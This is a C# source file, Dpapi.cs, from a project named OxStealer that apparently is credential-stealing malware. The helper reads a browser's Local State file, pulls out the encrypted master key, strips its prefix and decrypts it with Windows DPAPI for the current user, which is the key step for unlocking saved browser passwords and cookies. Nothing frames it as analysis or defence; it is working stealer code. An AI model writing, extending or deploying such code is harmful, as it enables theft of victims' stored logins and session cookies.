// Utils/Dpapi.cs
using System;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.IO;

namespace OxStealer.Utils
{
    internal static class Dpapi
    {
        public static byte[] Decrypt(byte[] data)
        {
            try { return ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser); }
            catch { return Array.Empty<byte>(); }
        }

        public static byte[] MasterKey(string localStatePath)
        {
            try
            {
                var json = JsonDocument.Parse(File.ReadAllText(localStatePath));
                var enc = Convert.FromBase64String(json.RootElement
                    .GetProperty("os_crypt").GetProperty("encrypted_key").GetString());
                if (enc.Length > 5) enc = enc[5..];
                return Decrypt(enc);
            }
            catch { return null; }
        }
    }
}